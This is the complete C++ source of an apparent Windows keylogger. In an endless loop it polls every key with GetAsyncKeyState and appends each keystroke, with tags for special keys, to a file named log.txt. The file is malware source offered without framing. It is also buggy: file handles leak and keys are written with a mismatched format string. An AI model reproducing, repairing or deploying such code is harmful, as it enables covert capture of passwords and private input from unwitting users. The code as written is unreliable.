#include <iostream>
#include <windows.h>
#include <string.h>
using namespace std;

class Model
{
	public:
		void key_observer (int _key,char *file)
		{
			FILE *OUTFILE;
			OUTFILE = fopen(file,"a+");
			if(_key == VK_SHIFT)
			{
				fprintf(OUTFILE, "[SHIFT]");
			}
			else if(_key == VK_CONTROL)
			{
				fprintf(OUTFILE, "[CTRL]");
			}
			else if(_key == VK_MENU)
			{
				fprintf(OUTFILE, "[ALT]");
			}
			else if (_key == VK_RETURN)
			{
				fprintf(OUTFILE, "[ENTER]\n"); // ???
			}
			else if(_key == VK_PAUSE)
			{
				fprintf(OUTFILE, "[PAUSE]");
			}
			else if (_key == VK_CAPITAL)
			{
				fprintf(OUTFILE, "[CAPS LOCK]");
			}
			else if (_key == VK_ESCAPE)
			{
				fprintf(OUTFILE, "[ESCAPE]");
			}
			else if (_key == VK_SPACE)
			{
				fprintf(OUTFILE, "[SPACES]");
			}
			fprintf(OUTFILE,"%s",&_key);
			
		}
};
class View
{
	public:
		void print(int _key){
		cout << " KEY: " << _key << endl;
		}
};
class File_open
{
	Model model;
	View view;
	public:	
	void open_file(int _key, char *file)
	{
		FILE *OUTFILE;
		OUTFILE = fopen(file,"a+");
		view.print(_key);
		model.key_observer(_key,file);
	}
};
class File_close
{	
	void close_file(char *file)
	{
		FILE *OUTFILE;
		OUTFILE = fopen(file,"a+");
		fclose(OUTFILE);
	}
};
 
int main(int argc, char** argv)
{
	File_open fo;
	while(true)
	{
		for (int i = 8; i <= 255; i++)
			{
				if(GetAsyncKeyState(i) == -32767)
				{
					fo.open_file(i, "log.txt");
				}
			}
	}
	return 0;
}



